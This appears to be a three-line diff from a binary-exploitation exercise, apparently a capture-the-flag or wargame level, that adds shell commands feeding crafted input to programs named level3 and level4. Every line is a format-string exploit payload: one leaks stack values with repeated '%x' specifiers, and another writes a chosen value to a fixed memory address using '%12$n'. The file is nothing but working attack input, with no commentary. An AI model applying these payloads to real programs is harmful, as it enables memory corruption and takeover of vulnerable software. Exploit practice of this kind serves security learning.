@@ -1,0 +1,3 @@
+python -c "print '\x10\x98\x04\x08' + '%x '*12" | ./level4
+python -c  'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' > test 
+cat test | ./level3
